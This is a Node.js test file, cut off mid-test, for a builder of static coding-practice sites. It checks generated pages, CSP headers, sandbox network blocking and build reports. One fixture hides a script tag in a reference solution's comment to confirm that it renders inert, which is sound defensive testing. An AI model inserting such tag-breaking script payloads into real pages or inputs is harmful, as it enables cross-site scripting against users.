import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFile } from "node:fs/promises";
import { test } from "node:test";
import vm from "node:vm";

import { transform } from "esbuild-wasm";

import {
  LEARNER_CODE_EDITOR_CSP_SOURCE,
  LEARNER_CODE_EDITOR_VERSION,
} from "../dist/learner-code-editor.js";
import {
  QUESTION_GROUP_BUILD_MARKER,
  QUESTION_GROUP_LEARNER_TRANSFORM_OPTIONS,
  QUESTION_GROUP_PLAYER_VERSION,
  buildStandaloneQuestionGroupSite,
  createQuestionGroupRunGuard,
  questionGroupSandboxWorkerJavaScript,
} from "../dist/question-group-site.js";

async function exampleLibrary() {
  const guide = await readFile(
    new URL("../../../docs/question-groups.md", import.meta.url),
    "utf8",
  );
  return JSON.parse(guide.match(/```json\n([\s\S]*?)\n```/)?.[1] ?? "null");
}

test("Question Group builds are complete static practice sites with a leech query", async () => {
  const library = await exampleLibrary();
  const declarations = await readFile(
    new URL("../dist/question-group-site.d.ts", import.meta.url),
    "utf8",
  );
  const files = await buildStandaloneQuestionGroupSite(library);
  const repeated = await buildStandaloneQuestionGroupSite(structuredClone(library));
  assert.equal(QUESTION_GROUP_PLAYER_VERSION, 2);
  assert.match(declarations, /viewExampleSolution\?: string;/);
  assert.match(declarations, /exampleInputLabel\?: string;/);
  assert.match(declarations, /draftChanged\?: string;/);
  assert.equal(files[".latent-build"], `${QUESTION_GROUP_BUILD_MARKER}\n`);
  assert.ok(files["assets/esbuild.wasm"] instanceof Uint8Array);
  assert.ok(files["assets/esbuild.wasm"].byteLength > 1_000_000);
  assert.match(files["index.html"], /data-initial-query="all"/);
  assert.match(files["leeches/index.html"], /data-initial-query="leeches"/);
  assert.match(files["index.html"], /<body class="learner-ui"/);
  assert.match(files["index.html"], /data-learner-atmosphere aria-hidden="true"/);
  assert.match(files["index.html"], /class="learner-skip-link"/);
  assert.match(files["index.html"], /class="learner-header"/);
  assert.match(files["index.html"], /src="\.\/assets\/learner-code-editor\.js"/);
  assert.match(files["index.html"], /src="\.\/assets\/learner-ui\.js"/);
  assert.match(
    files["leeches/index.html"],
    /src="\.\.\/assets\/learner-code-editor\.js"/,
  );
  assert.match(files["leeches/index.html"], /src="\.\.\/assets\/learner-ui\.js"/);
  assert.ok(
    files["index.html"].indexOf("assets/learner-code-editor.js")
      < files["index.html"].indexOf("assets/learner-ui.js"),
  );
  assert.ok(
    files["index.html"].indexOf("assets/learner-ui.js")
      < files["index.html"].indexOf("assets/player.js"),
  );
  assert.match(files["index.html"], new RegExp(LEARNER_CODE_EDITOR_CSP_SOURCE));
  assert.doesNotMatch(files["index.html"], /style-src[^;"]*'unsafe-inline'/);
  assert.equal(typeof files["assets/learner-code-editor.js"], "string");
  assert.match(
    files["assets/learner-code-editor.js"],
    /LatentLearnerCodeEditorRuntime/,
  );
  assert.ok(
    Buffer.byteLength(files["assets/learner-code-editor.js"], "utf8") < 650_000,
  );
  assert.match(
    files["THIRD_PARTY_NOTICES.md"],
    /CodeMirror 6[\s\S]*Lezer[\s\S]*MIT/,
  );
  assert.match(files["assets/player.css"], /--learner-font-sans:/);
  assert.match(files["assets/player.css"], /--learner-background-recipe: paper;/);
  assert.match(files["assets/player.css"], /\.learner-ui :focus-visible/);
  const practiceLayoutCss = files["assets/player.css"].match(
    /\.practice-layout\s*\{([^}]*)\}/,
  )?.[1];
  const libraryCss = files["assets/player.css"].match(
    /\.library\s*\{([^}]*)\}/,
  )?.[1];
  const questionCopyCss = files["assets/player.css"].match(
    /\.question-copy\s*\{([^}]*)\}/,
  )?.[1];
  const workspaceCss = files["assets/player.css"].match(
    /\.workspace\s*\{([^}]*)\}/,
  )?.[1];
  const framedSolutionCss = files["assets/player.css"].match(
    /\.learner-editor-frame \.learner-solution\s*\{([^}]*)\}/,
  )?.[1];
  const resultsCss = files["assets/player.css"].match(
    /\.workspace \.learner-results\s*\{([^}]*)\}/,
  )?.[1];
  assert.match(practiceLayoutCss ?? "", /max-width:\s*72rem/);
  assert.doesNotMatch(practiceLayoutCss ?? "", /grid-template-columns|min-height:\s*calc/);
  assert.match(libraryCss ?? "", /overflow:\s*visible/);
  assert.doesNotMatch(libraryCss ?? "", /overflow:\s*auto/);
  assert.match(questionCopyCss ?? "", /overflow:\s*visible/);
  assert.doesNotMatch(questionCopyCss ?? "", /overflow:\s*auto/);
  assert.match(workspaceCss ?? "", /display:\s*flex/);
  assert.doesNotMatch(workspaceCss ?? "", /grid-template-rows|min-height:\s*46rem/);
  assert.match(framedSolutionCss ?? "", /border-top:\s*0/);
  assert.match(framedSolutionCss ?? "", /margin-top:\s*0/);
  assert.match(framedSolutionCss ?? "", /padding:\s*0 var\(--learner-space-4\)/);
  assert.match(resultsCss ?? "", /overflow:\s*visible/);
  assert.doesNotMatch(resultsCss ?? "", /overflow:\s*auto/);
  assert.match(
    files["assets/player.css"],
    /\.workspace \.learner-editor,\s*\.workspace \.learner-code-editor\s*\{[^}]*min-height:\s*var\(--learner-editor-min-height\);[^}]*overflow:\s*auto;[^}]*resize:\s*vertical;/,
  );
  assert.match(
    files["assets/player.css"],
    /\.question-copy h2\s*\{[^}]*font-family: var\(--learner-font-reading\)/,
  );
  assert.match(
    files["assets/player.css"],
    /\.question-copy h2\[tabindex="-1"\]\s*\{[^}]*width:\s*fit-content/,
  );
  assert.match(files["assets/learner-ui.js"], /event\.key !== "Escape"/);
  assert.match(files["assets/learner-ui.js"], /const prepareCodeEditor = /);
  assert.match(
    files["assets/learner-ui.js"],
    /Python code editor\.[\s\S]*Tab indents [\s\S]*Shift\+Tab outdents\. Press Escape, then Tab, to leave the editor\./,
  );
  assert.match(
    files["assets/player.js"],
    /globalThis\.LearnerUiComponents\?\.prepareCodeEditor/,
  );
  assert.match(
    files["assets/player.js"],
    /tabSize: question\.language === "python" \? 4 : 2/,
  );
  assert.match(
    files["assets/player.js"],
    /onRun: \(mode\) => \{[\s\S]*void run\(mode\)/,
  );
  assert.match(files["assets/player.js"], /codeEditor\?\.setDisabled\?\./);
  assert.match(files["assets/player.js"], /codeEditor\?\.destroy\?\./);
  assert.match(files["assets/player.js"], /codeEditor\?\.focus\?\./);
  assert.match(
    files["assets/player.js"],
    /supportsEditableExamples: true/,
  );
  assert.match(
    files["assets/player.js"],
    /runtimeAdapter\.supportsEditableExamples === true/,
  );
  assert.match(
    files["assets/player.js"],
    /exampleList\.className = "example-cases"/,
  );
  assert.doesNotMatch(files["assets/player.js"], /event\.key === "Tab"|setRangeText/);
  assert.match(files["assets/player.js"], /isLeech/);
  assert.match(files["assets/player.js"], /new Worker/);
  assert.match(files["assets/player.js"], /indexedDB\.open\("latent-question-groups"/);
  assert.match(files["assets/player.js"], /transaction\("progress", "readwrite"\)/);
  assert.match(files["assets/player.js"], /libraryDigest/);
  assert.match(files["assets/player.js"], /latent\.question-groups\.draft\.v1:/);
  assert.match(files["assets/player.js"], /format: "latent-question-group-draft"/);
  assert.match(
    files["assets/player.js"],
    /entry\.libraryDigest === libraryDigest[\s\S]*entry\.contractVersion === contractVersion/,
  );
  assert.match(files["assets/player.js"], /const \[progress, drafts\] = await Promise\.all/);
  assert.match(files["assets/player.js"], /draftSourceFor\(entry\.group, entry\.question\)/);
  assert.match(files["assets/player.js"], /draftStatus\.setAttribute\("aria-live", "polite"\)/);
  assert.match(files["assets/player.js"], /copy\.draftSessionOnly/);
  assert.match(files["assets/player.js"], /learner-progress-summary/);
  assert.match(files["assets/player.js"], /learner-resume/);
  assert.match(
    files["assets/player.js"],
    /const libraryHeader = document\.createElement\("div"\)/,
  );
  assert.match(files["assets/player.js"], /const sidebar = document\.createElement\("div"\)/);
  assert.doesNotMatch(files["assets/player.js"], /const sidebar = document\.createElement\("aside"\)/);
  assert.match(
    files["assets/player.js"],
    /const workspaceHeader = document\.createElement\("div"\)/,
  );
  assert.match(files["assets/player.js"], /publicExamplesHeading/);
  assert.match(
    files["assets/player.js"],
    /globalThis\.LearnerUiComponents\?\.createEditableExamples/,
  );
  assert.match(
    files["assets/player.js"],
    /workspace\.append\(\s*workspaceHeader,\s*editor,\s*actions,\s*resultAnnouncement,\s*results,\s*solutionHost,\s*\)/,
  );
  assert.match(files["assets/player.js"], /exampleController\?\.invalidate\?\.\(\)/);
  assert.match(
    files["assets/player.js"],
    /source !== lastSettledRunSource[\s\S]*copy\.draftChanged/,
  );
  assert.match(files["assets/learner-ui.js"], /const createEditableExamples = /);
  assert.match(
    files["assets/learner-ui.js"],
    /Enter one JSON array containing the function arguments\. This run does not affect progress\./,
  );
  assert.match(files["assets/learner-ui.js"], /Use an array of function arguments\./);
  assert.match(files["assets/learner-ui.js"], /JSON values may not be nested more than 12 levels\./);
  assert.match(files["assets/learner-ui.js"], /firstInvalid\.focus\(\)/);
  assert.match(
    files["assets/learner-ui.js"],
    /input\.setAttribute\("aria-describedby", hintId \+ " " \+ errorId\)/,
  );
  assert.match(files["assets/learner-ui.js"], /input\.setAttribute\("aria-keyshortcuts"/);
  assert.match(files["assets/learner-ui.js"], /record\.status\.textContent = labels\.received/);
  assert.match(
    files["assets/player.js"],
    /question: \{ \.\.\.question, cases: \[scopedCase\] \}/,
  );
  assert.match(files["assets/player.js"], /mode: "examples",[\s\S]*signal,/);
  assert.match(files["assets/player.js"], /includeObservation: true,[\s\S]*signal,/);
  assert.match(files["assets/player.js"], /return normalizeObservation\(result\?\.observation\)/);
  assert.match(
    files["assets/player.js"],
    /if \(request\.includeObservation === true\) \{[\s\S]*normalizedCase\.observation = normalizeObservation/,
  );
  assert.match(
    files["assets/player.js"],
    /if \(mode === "check"\) \{[\s\S]*writeProgress/,
  );
  assert.doesNotMatch(files["question-group-library.json"], /Run this input|Modified input/);
  assert.match(files["assets/player.js"], /new AbortController\(\)/);
  assert.match(files["assets/player.js"], /activeRunController\?\.abort\(\)/);
  assert.match(files["assets/learner-ui.js"], /event\.ctrlKey \|\| event\.metaKey/);
  assert.match(
    files["assets/learner-ui.js"],
    /const mode = event\.shiftKey \? "examples" : "check";[\s\S]*current\.runModes\.includes\(mode\)\) current\.onRun\(mode\)/,
  );
  assert.match(files["assets/player.js"], /copy\.runCanceled/);
  assert.match(
    files["assets/player.js"],
    /navigation\.open = false/,
  );
  assert.match(files["assets/player.js"], /navigation\.dataset\.learnerCollapseAt = "always"/);
  assert.match(
    files["assets/player.js"],
    /button\.addEventListener\("click", \(\) => \{[\s\S]*navigation\.removeAttribute\("open"\);[\s\S]*renderActive\(true\)/,
  );
  assert.doesNotMatch(files["assets/player.js"], /navigationBreakpoint/);
  assert.match(files["assets/player.js"], /learner-sr-only/);
  assert.match(files["assets/player.js"], /question-result-announcement/);
  assert.match(
    files["assets/player.js"],
    /resultAnnouncement\.setAttribute\("aria-live", "polite"\)/,
  );
  assert.doesNotMatch(
    files["assets/player.js"],
    /results\.setAttribute\("aria-live", "polite"\)/,
  );
  assert.match(
    files["assets/player.js"],
    /results\.setAttribute\("aria-label", copy\.initialResults\)/,
  );
  assert.match(files["assets/player.js"], /results\.tabIndex = 0/);
  assert.match(files["assets/player.js"], /exerciseCase\.passed \? "Pass · " : "Fail · "/);
  assert.match(files["assets/player.js"], /text\("h1", library\.library\.title\)/);
  assert.match(files["assets/player.js"], /message\.setAttribute\("role", "status"\)/);
  assert.match(files["assets/player.js"], /app\.replaceChildren\(empty\);\s*empty\.focus\(\{ preventScroll: true \}\)/);
  assert.match(
    files["assets/player.js"],
    /navigation\.removeAttribute\("open"\);[\s\S]*?renderActive\(true\)/,
  );
  assert.match(
    files["assets/player.js"],
    /target\.focus\(\{ preventScroll: true \}\);[\s\S]*?target\.scrollIntoView/,
  );
  assert.match(files["assets/player.js"], /focusAndReveal\(heading, "center"\)/);
  assert.match(files["assets/player.js"], /\(codeEditor\?\.host \|\| editor\)\.scrollIntoView/);
  assert.match(
    files["assets/player.js"],
    /announceResult\(outcome\.passed \? copy\.passedHeading : copy\.failedHeading\)/,
  );
  assert.doesNotMatch(
    files["assets/player.js"],
    /"Detailed results"|passedCaseCount|checkLabel|Review the detailed results/,
  );
  assert.match(
    files["assets/player.js"],
    /if \(running\) \{[\s\S]*?results\.replaceChildren\(text\("p", copy\.initialResults\)\);[\s\S]*?announceResult\(copy\.initialResults\)/,
  );
  assert.doesNotMatch(files["assets/player.js"], /localStorage/);
  assert.match(files["assets/player.js"], /returned an inconsistent case result/);
  assert.match(files["assets/player.js"], /const visibleEntries = \(\) =>/);
  assert.match(
    files["assets/player.js"],
    /initialQuery === "leeches" && !isLeech\(progress\[key\]\)/,
  );
  assert.match(files["assets/player.js"], /const runGuard =/);
  assert.match(files["assets/player.js"], /button\.disabled = running/);
  assert.match(files["assets/player.js"], /signal: controller\.signal/);
  assert.match(files["assets/player.js"], /runGuard\.isCurrent/);
  assert.match(files["assets/player.js"], /if \(!isCurrentRun\(\)\) return/);
  assert.match(
    files["assets/player.js"],
    /question\.entrypoint\.kind === "function"[\s\S]*\(__latent_constructor_args, __latent_method_args\) => [\s\S]*\(\.\.\.__latent_method_args\)/,
  );
  assert.doesNotMatch(
    files["assets/player.js"],
    /\(\.\.\.__latent_args\) => [\s\S]*\(\.\.\.__latent_args\)/,
  );
  assert.match(files["assets/sandbox.worker.js"], /"fetch",[\s\S]*"WebSocket"/);
  assert.match(
    files["assets/sandbox.worker.js"],
    /if \(payload\.includeObservation === true\) \{[\s\S]*caseResult\.observation =/,
  );
  assert.match(
    files["assets/player.js"],
    /includeObservation: request\.includeObservation === true,[\s\S]*maxOutputBytes/,
  );
  assert.match(files["_headers"], /connect-src 'none'/);
  assert.match(files["_headers"], new RegExp(LEARNER_CODE_EDITOR_CSP_SOURCE));
  assert.doesNotMatch(files["_headers"], /style-src[^\n]*'unsafe-inline'/);
  assert.doesNotMatch(files["question-group-library.json"], /runtime-adapter\.js/);

  const report = JSON.parse(files["build-report.json"]);
  assert.equal(report.playerVersion, QUESTION_GROUP_PLAYER_VERSION);
  assert.equal(report.learnerUiVersion, 2);
  assert.deepEqual(report.learnerCodeEditor, {
    version: LEARNER_CODE_EDITOR_VERSION,
    bytes: Buffer.byteLength(files["assets/learner-code-editor.js"], "utf8"),
    sha256: createHash("sha256")
      .update(files["assets/learner-code-editor.js"])
      .digest("hex"),
  });
  assert.equal(report.reviewDirectory, "leeches");
  assert.equal(report.bundledBrowserRuntime, true);
  assert.deepEqual(report.referenceSolutions, {
    count: 0,
    sha256: createHash("sha256").update("[]").digest("hex"),
  });
  assert.deepEqual(report.browserRuntimes, ["browser-javascript"]);
  assert.equal(report.files.includes("leeches/index.html"), true);
  assert.match(
    files["README.txt"],
    /Python and\s+host-managed requirements remain disabled/,
  );
  assert.match(
    files["README.txt"],
    /Editor drafts use separate digest- and contract-bound records/,
  );
  assert.equal(repeated["question-group-library.json"], files["question-group-library.json"]);
  assert.equal(
    repeated["THIRD_PARTY_NOTICES.md"],
    files["THIRD_PARTY_NOTICES.md"],
  );
  assert.equal(
    repeated["assets/learner-code-editor.js"],
    files["assets/learner-code-editor.js"],
  );
  assert.equal(repeated["build-report.json"], files["build-report.json"]);
  assert.deepEqual(repeated["assets/esbuild.wasm"], files["assets/esbuild.wasm"]);
});

test("run identity drops delayed examples and checks after question switches", async () => {
  const guard = createQuestionGroupRunGuard();
  let activeQuestion = "group/a";
  let activeSource = "source a";
  const rendered = [];
  const progressWrites = [];

  let resolveExamples;
  const delayedExamples = new Promise((resolve) => {
    resolveExamples = resolve;
  });
  const exampleToken = guard.begin(activeQuestion, activeSource);
  const exampleSettlement = delayedExamples.then((outcome) => {
    if (guard.isCurrent(exampleToken, activeQuestion, activeSource)) {
      rendered.push(outcome);
    }
  });
  guard.invalidate();
  activeQuestion = "group/b";
  activeSource = "source b";
  resolveExamples({ mode: "examples", passed: true });
  await exampleSettlement;
  assert.deepEqual(rendered, []);

  let resolveCheck;
  const delayedCheck = new Promise((resolve) => {
    resolveCheck = resolve;
  });
  const checkToken = guard.begin(activeQuestion, activeSource);
  const checkSettlement = delayedCheck.then((outcome) => {
    if (guard.isCurrent(checkToken, activeQuestion, activeSource)) {
      rendered.push(outcome);
      progressWrites.push(checkToken.questionKey);
    }
  });
  guard.invalidate();
  activeQuestion = "group/a";
  activeSource = "source a";
  resolveCheck({ mode: "check", passed: false });
  await checkSettlement;

  assert.deepEqual(rendered, []);
  assert.deepEqual(progressWrites, []);
});

test("runtime injection is a build-time host option, never a content field", async () => {
  const files = await buildStandaloneQuestionGroupSite(
    await exampleLibrary(),
    { runtimeAdapterJavaScript: "globalThis.LatentQuestionPlayerRuntime = trustedAdapter;\n" },
  );
  assert.equal(
    files["assets/runtime-adapter.js"],
    "globalThis.LatentQuestionPlayerRuntime = trustedAdapter;\n",
  );
});

test("custom page CSP keeps caller directives and admits only the reviewed editor styles", async () => {
  const files = await buildStandaloneQuestionGroupSite(
    await exampleLibrary(),
    {
      bundledBrowserRuntime: false,
      metaContentSecurityPolicy: [
        "default-src 'none'",
        "style-src 'none'",
        "style-src-elem 'sha256-YWJj'",
        "worker-src 'self'",
      ].join("; "),
    },
  );
  const html = files["index.html"];
  assert.match(
    html,
    new RegExp(
      `style-src 'self' ${
        LEARNER_CODE_EDITOR_CSP_SOURCE.replaceAll(/[.*+?^${}()|[\]\\]/g, "\\$&")
      }`,
    ),
  );
  assert.match(
    html,
    new RegExp(
      `style-src-elem 'sha256-YWJj' 'self' ${
        LEARNER_CODE_EDITOR_CSP_SOURCE.replaceAll(/[.*+?^${}()|[\]\\]/g, "\\$&")
      }`,
    ),
  );
  assert.doesNotMatch(html, /style-src[^;"]*'none'/);
  assert.doesNotMatch(html, /style-src[^;"]*'unsafe-inline'/);
});

test("Question Group UI configuration controls branding, routes, copy, and runtime assets without changing portable identity", async () => {
  const library = await exampleLibrary();
  const baseline = await buildStandaloneQuestionGroupSite(library, {
    bundledBrowserRuntime: false,
  });
  const configured = await buildStandaloneQuestionGroupSite(
    structuredClone(library),
    {
      bundledBrowserRuntime: false,
      metaContentSecurityPolicy: "default-src 'none'; worker-src 'self'",
      ui: {
        productName: "Python <Practice>",
        headerMeta: "Ten focused exercises",
        globalNavigationLabel: "Learning products",
        globalNavigation: [
          { label: "Course", href: "../llm-systems/" },
          { label: "Practice", href: "./", current: true },
        ],
        navigationLabel: "Problem navigation",
        menuLabel: "Browse practice",
        reviewDirectory: "review",
        copy: {
          allNavigationLabel: "Problems",
          reviewNavigationLabel: "Review misses",
          allEyebrow: "Focused practice",
          reviewEyebrow: "Try these again",
          runExamples: "Run public examples",
          checkSolution: "Check full solution",
          continueLabel: "Continue next",
          editorLabel: "Python answer",
          draftSaved: "Answer saved",
          draftChanged: "Answer changed. Run it again.",
          runtimeUnavailable: "Practice is taking a break.",
          viewExampleSolution: "Open worked answer",
        },
        footerSummary: "Progress stays with this exact set.",
        attribution: "A quiet attribution.",
        appearance: {
          palette: "cobalt",
          theme: {
            accent: "#123ABC",
            focus: "#FEDCBA",
          },
        },
      },
    },
  );
  const legacyTheme = await buildStandaloneQuestionGroupSite(
    structuredClone(library),
    {
      bundledBrowserRuntime: false,
      ui: {
        theme: {
          accent: "#234567",
        },
      },
    },
  );

  assert.equal("review/index.html" in configured, true);
  assert.equal("leeches/index.html" in configured, false);
  assert.match(configured["index.html"], /Python &lt;Practice&gt;/);
  assert.doesNotMatch(configured["index.html"], /Python <Practice>/);
  assert.match(configured["index.html"], /learner-header__meta">Ten focused exercises/);
  assert.match(configured["index.html"], /aria-label="Learning products"/);
  assert.match(configured["index.html"], /href="\.\.\/llm-systems\/">Course<\/a>/);
  assert.match(
    configured["review/index.html"],
    /href="\.\.\/\.\.\/llm-systems\/">Course<\/a>/,
  );
  assert.match(
    configured["review/index.html"],
    /href="\.\.\/" aria-current="page">Practice<\/a>/,
  );
  assert.match(configured["index.html"], /aria-label="Problem navigation"/);
  assert.match(configured["index.html"], />Browse practice<\/summary>/);
  assert.match(configured["index.html"], /href="\.\/" aria-current="page">Problems<\/a>/);
  assert.match(configured["index.html"], /href="\.\/review\/">Review misses<\/a>/);
  assert.match(configured["review/index.html"], /href="\.\.\/">Problems<\/a>/);
  assert.match(
    configured["review/index.html"],
    /href="\.\/" aria-current="page">Review misses<\/a>/,
  );
  assert.match(configured["review/index.html"], /href="\.\.\/assets\/player\.css"/);
  assert.match(
    configured["review/index.html"],
    /data-library-url="\.\.\/question-group-library\.json"/,
  );
  assert.match(
    configured["review/index.html"],
    /src="\.\.\/assets\/learner-code-editor\.js"/,
  );
  assert.match(configured["review/index.html"], /src="\.\.\/assets\/learner-ui\.js"/);
  assert.match(configured["assets/player.css"], /--learner-color-canvas: #eaf0fa;/);
  assert.match(configured["assets/player.css"], /--learner-color-accent: #123abc;/);
  assert.match(configured["assets/player.css"], /--learner-color-focus: #fedcba;/);
  assert.match(configured["assets/player.css"], /--learner-background-recipe: cobalt;/);
  assert.match(legacyTheme["assets/player.css"], /--learner-color-accent: #234567;/);
  assert.match(legacyTheme["assets/player.css"], /--learner-background-recipe: paper;/);
  assert.match(configured["assets/player.js"], /"runExamples":"Run public examples"/);
  assert.match(configured["assets/player.js"], /"checkSolution":"Check full solution"/);
  assert.match(configured["assets/player.js"], /"continueLabel":"Continue next"/);
  assert.match(configured["assets/player.js"], /"cancelRun":"Cancel"/);
  assert.match(configured["assets/player.js"], /"editorLabel":"Python answer"/);
  assert.match(configured["assets/player.js"], /"draftSaved":"Answer saved"/);
  assert.match(
    configured["assets/player.js"],
    /"draftChanged":"Answer changed\. Run it again\."/,
  );
  assert.match(
    configured["assets/player.js"],
    /"runtimeUnavailable":"Practice is taking a break\."/,
  );
  assert.match(configured["assets/player.js"], /"viewExampleSolution":"Open worked answer"/);
  assert.match(configured["index.html"], /Progress stays with this exact set\./);
  assert.match(configured["index.html"], /A quiet attribution\./);
  const normalizedCustomPolicy =
    `default-src 'none'; worker-src 'self'; style-src 'self' ${LEARNER_CODE_EDITOR_CSP_SOURCE}`;
  assert.equal(configured["index.html"].includes(normalizedCustomPolicy), true);
  assert.equal(
    configured["review/index.html"].includes(normalizedCustomPolicy),
    true,
  );
  assert.doesNotMatch(configured["index.html"], /style-src[^;"]*'unsafe-inline'/);
  assert.match(baseline["index.html"], /worker-src 'self' blob:/);

  for (const compilerAsset of [
    "assets/esbuild.js",
    "assets/esbuild.wasm",
    "assets/sandbox.worker.js",
  ]) {
    assert.equal(compilerAsset in configured, false, compilerAsset);
  }
  assert.doesNotMatch(configured["index.html"], /assets\/esbuild\.js/);
  assert.doesNotMatch(configured["review/index.html"], /assets\/esbuild\.js/);
  assert.equal("assets/runtime-adapter.js" in configured, true);
  assert.match(
    configured["assets/player.js"],
    /const bundledBrowserRuntime = false;/,
  );
  assert.match(
    configured["assets/player.js"],
    /: bundledBrowserRuntime\s*\? browserRuntime\s*: \{/,
  );
  assert.match(
    configured["assets/player.js"],
    /supports\(\) \{ return false; \}/,
  );

  const baselineReport = JSON.parse(baseline["build-report.json"]);
  const configuredReport = JSON.parse(configured["build-report.json"]);
  assert.equal(configuredReport.reviewDirectory, "review");
  assert.equal(configuredReport.bundledBrowserRuntime, false);
  assert.equal(configuredReport.metaContentSecurityPolicy, "custom");
  assert.equal(baselineReport.metaContentSecurityPolicy, "default");
  assert.deepEqual(configuredReport.browserRuntimes, []);
  assert.equal(configuredReport.sha256, baselineReport.sha256);
  assert.equal(
    configured["question-group-library.json"],
    baseline["question-group-library.json"],
  );
  assert.equal(
    JSON.parse(legacyTheme["build-report.json"]).sha256,
    baselineReport.sha256,
  );
});

test("suiteHeader keeps a persistent global identity while local practice navigation stays in the content plane", async () => {
  const library = await exampleLibrary();
  const baseline = await buildStandaloneQuestionGroupSite(library, {
    bundledBrowserRuntime: false,
  });
  const files = await buildStandaloneQuestionGroupSite(
    structuredClone(library),
    {
      bundledBrowserRuntime: false,
      ui: {
        productName: "Ten Problems",
        headerMeta: "10 Python problems",
        suiteHeader: {
          productName: "Learning Studio",
          homeHref: "../",
          homeLabel: "Learning Studio home",
          navigationLabel: "Learning suite",
          navigation: [
            { label: "LLM Systems", href: "../llm-systems/" },
            { label: "Interview Loop", href: "../interview-loop/" },
            { label: "Ten Problems", href: "./", current: true },
          ],
          menuLabel: "Experiences",
          meta: "Courses and practice",
        },
        navigationLabel: "Problem navigation",
        reviewDirectory: "review",
        copy: {
          allNavigationLabel: "Problems",
          reviewNavigationLabel: "Review misses",
        },
      },
    },
  );

  assert.equal((files["index.html"].match(/<header\b/g) ?? []).length, 1);
  assert.match(
    files["index.html"],
    /class="learner-wordmark" href="\.\.\/" aria-label="Learning Studio home"/,
  );
  assert.match(files["index.html"], /<span>Learning Studio<\/span>/);
  assert.match(files["index.html"], /learner-header__meta">Courses and practice/);
  assert.match(files["index.html"], /aria-label="Learning suite"/);
  assert.match(files["index.html"], />Experiences<\/summary>/);
  assert.match(files["index.html"], /href="\.\.\/llm-systems\/">LLM Systems<\/a>/);
  assert.match(
    files["index.html"],
    /href="\.\/" aria-current="page">Ten Problems<\/a>/,
  );
  assert.match(
    files["index.html"],
    /<nav class="learner-context-nav" aria-label="Problem navigation">/,
  );
  assert.match(
    files["index.html"],
    /href="\.\/" aria-current="page">Problems<\/a>/,
  );
  assert.match(files["index.html"], /href="\.\/review\/">Review misses<\/a>/);

  assert.match(
    files["review/index.html"],
    /class="learner-wordmark" href="\.\.\/\.\.\/" aria-label="Learning Studio home"/,
  );
  assert.match(
    files["review/index.html"],
    /href="\.\.\/\.\.\/llm-systems\/">LLM Systems<\/a>/,
  );
  assert.match(
    files["review/index.html"],
    /href="\.\.\/" aria-current="page">Ten Problems<\/a>/,
  );
  assert.match(files["review/index.html"], /href="\.\.\/">Problems<\/a>/);
  assert.match(
    files["review/index.html"],
    /href="\.\/" aria-current="page">Review misses<\/a>/,
  );
  assert.equal(
    JSON.parse(files["build-report.json"]).sha256,
    JSON.parse(baseline["build-report.json"]).sha256,
  );
  assert.equal(
    files["question-group-library.json"],
    baseline["question-group-library.json"],
  );
  assert.doesNotMatch(baseline["index.html"], /learner-context-nav/);

  const absoluteFiles = await buildStandaloneQuestionGroupSite(
    structuredClone(library),
    {
      bundledBrowserRuntime: false,
      ui: {
        suiteHeader: {
          productName: "Learning Studio",
          homeHref: "/latent/",
          navigationLabel: "Learning suite",
          navigation: [
            { label: "LLM Systems", href: "/latent/llm-systems/" },
            { label: "Practice", href: "/latent/practice/", current: true },
          ],
        },
        reviewDirectory: "review",
      },
    },
  );
  assert.match(
    absoluteFiles["index.html"],
    /class="learner-wordmark" href="\/latent\/"/,
  );
  assert.match(
    absoluteFiles["review/index.html"],
    /class="learner-wordmark" href="\/latent\/"/,
  );
  assert.match(
    absoluteFiles["review/index.html"],
    /href="\/latent\/practice\/" aria-current="page">Practice<\/a>/,
  );
});

test("trusted reference solutions render as inert read-only disclosures without changing portable identity", async () => {
  const library = await exampleLibrary();
  const baseline = await buildStandaloneQuestionGroupSite(library, {
    bundledBrowserRuntime: false,
  });
  const referenceSolutions = [{
    groupId: "arithmetic",
    questionId: "add-two-values",
    source: `export function addTwoValues(left, right) {
  return left + right;
}
// </code><script>globalThis.referenceEscaped = false</script>
`,
  }];
  const files = await buildStandaloneQuestionGroupSite(
    structuredClone(library),
    {
      bundledBrowserRuntime: false,
      referenceSolutions,
    },
  );

  assert.equal(
    files["question-group-library.json"],
    baseline["question-group-library.json"],
  );
  assert.equal(
    JSON.parse(files["build-report.json"]).sha256,
    JSON.parse(baseline["build-report.json"]).sha256,
  );
  assert.match(files["assets/player.js"], /const referenceSolutions = /);
  assert.match(files["assets/player.js"], /return left \+ right/);
  assert.match(
    files["assets/player.js"],
    /solutionHost\.className = "learner-solution-host"/,
  );
  assert.match(
    files["assets/player.js"],
    /globalThis\.LearnerUiComponents\?\.createSolutionDisclosure/,
  );
  assert.match(
    files["assets/learner-ui.js"],
    /Compare the control flow and boundary cases with your draft\. Opening this reference does not replace your work or update progress\./,
  );
  assert.match(
    files["assets/learner-ui.js"],
    /details\.className = "learner-solution"/,
  );
  assert.match(
    files["assets/player.js"],
    /solutionHost\.append\(createSolutionDisclosure\(\{/,
  );
  assert.match(
    files["assets/learner-ui.js"],
    /code\.textContent = trustedSource/,
  );
  assert.match(files["assets/learner-ui.js"], /sourceFrame\.tabIndex = 0/);
  assert.doesNotMatch(files["assets/player.js"], /\.innerHTML/);
  assert.match(
    files["assets/player.css"],
    /\.learner-solution > summary\s*\{[^}]*min-height:\s*2\.75rem/,
  );
  assert.match(
    files["assets/player.css"],
    /\.learner-solution pre\s*\{[^}]*overflow:\s*auto/,
  );
  assert.doesNotMatch(
    files["question-group-library.json"],
    /return left \+ right|referenceEscaped/,
  );
  assert.doesNotMatch(
    files["assets/runtime-adapter.js"],
    /return left \+ right|referenceEscaped/,
  );

  const report = JSON.parse(files["build-report.json"]);
  assert.deepEqual(report.referenceSolutions, {
    count: 1,
    sha256: createHash("sha256")
      .update(JSON.stringify(referenceSolutions))
      .digest("hex"),
  });
  assert.doesNotMatch(files["build-report.json"], /return left \+ right/);
});

test("omitting trusted reference solutions remains compatible with an explicit empty list", async () => {
  const library = await exampleLibrary();
  const omitted = await buildStandaloneQuestionGroupSite(
    structuredClone(library),
    { bundledBrowserRuntime: false },
  );
  const explicitEmpty = await buildStandaloneQuestionGroupSite(
    structuredClone(library),
    {
      bundledBrowserRuntime: false,
      referenceSolutions: [],
    },
  );

  assert.equal(
    omitted["question-group-library.json"],
    explicitEmpty["question-group-library.json"],
  );
  assert.equal(omitted["assets/player.js"], explicitEmpty["assets/player.js"]);
  assert.equal(omitted["build-report.json"], explicitEmpty["build-report.json"]);
});

test("trusted reference solution input is strict, bounded, unique, and library-bound", async () => {
  const library = await exampleLibrary();
  const valid = {
    groupId: "arithmetic",
    questionId: "add-two-values",
